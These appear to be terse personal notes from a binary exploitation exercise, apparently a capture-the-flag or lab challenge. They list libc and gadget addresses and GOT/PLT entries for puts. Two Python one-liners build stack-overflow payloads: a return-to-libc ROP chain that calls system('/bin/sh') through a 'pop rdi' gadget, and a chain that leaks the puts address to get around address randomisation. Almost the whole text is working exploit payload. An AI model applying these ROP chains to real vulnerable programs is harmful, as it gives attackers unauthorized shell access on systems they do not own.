system(): 0x7ffff7e368a0
"/bin/sh": 0x001b3e9a


"pop rdi": 0x0000000000400733
libc.so.6 "/bin/sh": 0x001b3e9a
libc.so.6 system(): 0x4f440

payload: python -c 'print "A"*24 + "\x33\x07\x40\x00\x00\x00\x00\x00" + "\x9a\x3e\x1b\x00\x00\x00\x00\x00" + "\x40\xf4\x04\x00\x00\x00\x00\x00"'



got_put: 0x601018
plt_put: 0x400520
leaked puts payload: python -c 'print "A"*24 + "\x33\x07\x40\x00\x00\x00\x00\x00" + "\x18\x10\x60\x00\x00\x00\x00\x00" + "\x20\x05\x40\x00\x00\x00\x00\x00"'

main(): 0x400637
